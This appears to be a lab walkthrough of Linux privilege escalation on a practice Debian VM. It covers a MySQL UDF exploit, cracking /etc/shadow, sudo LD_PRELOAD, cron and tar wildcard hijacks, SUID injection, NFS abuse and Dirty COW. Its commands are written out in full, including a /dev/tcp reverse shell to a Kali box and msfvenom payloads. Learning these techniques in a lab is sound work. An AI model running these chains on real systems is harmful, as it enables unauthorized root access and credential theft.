# Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use 
a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the 
MySQL service.

Change into the ```/home/user/tools/mysql-udf``` directory:
```sh
cd /home/user/tools/mysql-udf
```
Compile the ```raptor_udf2.c``` exploit code using the following commands:
```sh
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password:
```sh
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```sh
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy ```/bin/bash``` to ```/tmp/rootbash``` and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```sh
/tmp/rootbash -p
```

Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```sh
rm /tmp/rootbash
exit
```

# Weak File Permissions - Readable /etc/shadow
The ```/etc/shadow``` file contains user password hashes and is usually readable only by the root user.

Note that the ```/etc/shadow``` file on the VM is world-readable:
```sh
ls -l /etc/shadow
```
View the contents of the ```/etc/shadow``` file:
```sh
cat /etc/shadow
```

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip ```/usr/share/wordlists/rockyou.txt.gz```
first and run the command using sudo depending on your version of Kali:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Switch to the root user, using the cracked password.

# Weak File Permissions - Writable /etc/shadow
The ```/etc/shadow``` file contains user password hashes and is usually readable only by the root user.

Note that the ```/etc/shadow``` file on the VM is world-writable:
```sh
ls -l /etc/shadow
```
Generate a new password hash with a password of your choice:
```sh
mkpasswd -m sha-512 newpasswordhere
```

Edit the ```/etc/shadow``` file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password.

# Weak File Permissions - Writable /etc/passwd
The ```/etc/passwd``` file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
Historically, the ```/etc/passwd``` file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the ```/etc/passwd``` file is world-writable:
```sh
ls -l /etc/passwd
```
Generate a new password hash with a password of your choice:
```sh
openssl passwd newpasswordhere
```
Edit the ```/etc/passwd``` file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password.

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the 
generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password.

# Sudo - Shell Escape Sequences
List the programs which sudo allows your user to run:
```sh
sudo -l
```

Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to 
elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

Q: Consider how you might use apache2 with sudo to gain root privileges without a shell escape sequence.
A: Look below section for answer.

# Sudo - Environment Variables
Sudo can be configured to inherit certain environment variables from the user's environment. Check which environment variables are inherited (look for the 
env_keep options):
```sh
sudo -l
```

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. 
LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at ```/home/user/tools/sudo/preload.c```:
```sh
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the 
new shared object:
```sh
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:
```sh
ldd /usr/sbin/apache2
```
Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```sh
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
```sh
sudo LD_LIBRARY_PATH=/tmp apache2
```
A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo
again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

# Cron Jobs - File Permissions
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. 
The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:
```sh
cat /etc/crontab
```

There should be two cron jobs scheduled to run every minute. One runs ```overwrite.sh```, the other runs ```/usr/local/bin/compress.sh```.

Locate the full path of the overwrite.sh file:
```sh
locate overwrite.sh
```

Note that the file is world-writable:
```sh
ls -l /usr/local/bin/overwrite.sh
```

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back 
to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?
```sh
nc -nvlp 4444
```

# Cron Jobs - PATH Environment Variable
View the contents of the system-wide crontab:
```sh
cat /etc/crontab
```

Note that the PATH variable starts with /home/user which is our user's home directory.
Create a file called overwrite.sh in your home directory with the following contents:
```sh
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:
```sh
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```sh
/tmp/rootbash -p
```

Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell.

# Cron Jobs - Wildcards
View the contents of the other cron job script:
```sh
cat /usr/local/bin/compress.sh
```

Note that the tar command is being run with a wildcard (```*```) in your home directory.
Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as 
part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file 
is executable:
```sh
chmod +x /home/user/shell.elf
```
Create these two files in /home/user:
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

When the tar command in the cron job runs, the wildcard (```*```) will expand to include these files. Since their filenames are valid tar command line 
options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect 
back to your netcat listener.
```sh
nc -nvlp 4444
```
Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
```sh
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

# SUID / SGID Executables - Known Exploits
Find all the SUID/SGID executables on the Debian VM:
```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Note that ```/usr/sbin/exim-4.84-3``` appears in the results. Try to find a known exploit for this version of exim. [Exploit-DB](https://www.exploit-db.com/), 
Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM 
at ```/home/user/tools/suid/exim/cve-2016-1531.sh```.

Run the exploit script to gain a root shell:
```sh
/home/user/tools/suid/exim/cve-2016-1531.sh
```

# SUID / SGID Executables - Shared Object Injection
The ```/usr/local/bin/suid-so``` SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:
```
/usr/local/bin/suid-so
```

Run strace on the file and search the output for open/access calls and for "no such file" errors:
```sh
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```

Example shared object code can be found at ```/home/user/tools/suid/libcalc.c```. It simply spawns a Bash shell. Compile the code into a shared object at the 
location the suid-so executable was looking for it:
```sh
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

libcalc.c
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
```sh
/usr/local/bin/suid-so
```

# SUID / SGID Executables - Environment Variables
The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without 
specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:
```sh
/usr/local/bin/suid-env
```

Run strings on the file to look for strings of printable characters:
```sh
strings /usr/local/bin/suid-env
```

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable 
(/usr/sbin/service) is not being used.

Compile the code located at ```/home/user/tools/suid/service.c``` into an executable called service. This code simply spawns a Bash shell:
```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

```sh
gcc -o service /home/user/tools/suid/service.c
```

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
```sh
PATH=.:$PATH /usr/local/bin/suid-env
```

# SUID / SGID Executables - Abusing Shell Features (#1)
The ```/usr/local/bin/suid-env2``` executable is identical to ```/usr/local/bin/suid-env``` except that it uses the absolute path of the service executable 
(/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:
```sh
strings /usr/local/bin/suid-env2
```

In Bash versions <4.2-048 **it is possible to define shell functions with names that resemble file paths**, then export those functions so that they are used 
instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:
```sh
/bin/bash --version
```

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
```sh
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run the suid-env2 executable to gain a root shell:
```sh
/usr/local/bin/suid-env2
```

# SUID / SGID Executables - Abusing Shell Features (#2)
Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4 to display an extra prompt** for debugging statements.

Run the ```/usr/local/bin/suid-env2``` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version 
of /bin/bash:
```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Run the ```/tmp/rootbash``` executable with -p to gain a shell running with root privileges:
```sh
/tmp/rootbash -p
```

Remember to remove the /tmp/rootbash executable and exit out of the elevated shell.

# Passwords & Keys - History Files
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:
```sh
cat ~/.*history | less
```

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is 
no space between the -p option and the password!

Switch to the root user, using the password.

# Passwords & Keys - Config Files
Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:
```sh
ls /home/user
```

Note the presence of a myvpn.ovpn config file. View the contents of the file:
```sh
cat /home/user/myvpn.ovpn
```

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials.

# Passwords & Keys - SSH Keys
Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:
```sh
ls -la /
```

Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
```sh
ls -l /.ssh
```

Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it 
is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise 
your SSH client will refuse to use it:
```sh
chmod 600 root_key
```

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):
```sh
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.71.15
```

# NFS
Files created via NFS inherit the remote user's ID. If the user is root, and **root squashing** is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:
```sh
cat /etc/exports
```
Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:
```sh
sudo su
```
Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
```sh
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
```sh
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Still using Kali's root user, make the file executable and set the SUID permission:
```sh
chmod +xs /tmp/nfs/shell.elf
```
Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
```sh
/tmp/shell.elf
```

# Kernel Exploits
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
```sh
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at ```/home/user/tools/kernel-exploits/dirtycow/c0w.c```. 
It replaces the SUID file ```/usr/bin/passwd``` with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):
```sh
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Once the exploit completes, run ```/usr/bin/passwd``` to gain a root shell:
```sh
/usr/bin/passwd
```

Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
```sh
mv /tmp/bak /usr/bin/passwd
```

# Privilege Escalation Scripts
- [LinPeas](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh)
- [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)
